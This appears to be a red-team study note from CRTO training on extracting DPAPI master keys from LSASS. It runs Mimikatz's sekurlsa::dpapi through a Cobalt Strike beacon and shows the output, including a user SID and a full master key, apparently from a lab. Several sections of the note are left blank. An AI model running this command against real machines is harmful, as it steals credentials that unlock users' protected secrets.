
This method is only possible if you have local admin access on the machine and if the key is cached in LSASS.  It will not be in the cache if the user has not recently accessed/decrypted the credential.

## 🖊️ via Cobalt Strike

```
beacon> mimikatz !sekurlsa::dpapi

Authentication Id : 0 ; 1075454 (00000000:001068fe)
Session           : RemoteInteractive from 2
User Name         : bfarmer
Domain            : DEV
Logon Server      : DC-2
Logon Time        : 9/6/2022 9:09:54 AM
SID               : S-1-5-21-569305411-121244042-2357301523-1104
	 [00000000]
	 * GUID      :	{bfc5090d-22fe-4058-8953-47f6882f549e}
	 * Time      :	9/6/2022 11:27:44 AM
	 * MasterKey :	8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
	 * sha1(key) :	897f7bf129e6a898ff4e20e9789009d5385be1f3

```  

We can see that the GUID (encrypted master key) matches what we are looking for, so the key `8d1539[...]19c214` is the one we need.


## 📔 Description

- 

##  📗 Action to perform 


### ⚠ Opsec




### Properties
---
📆 created   {{18-02-2024}} 12:01
🏷️ tags: #redteam #crto 

---

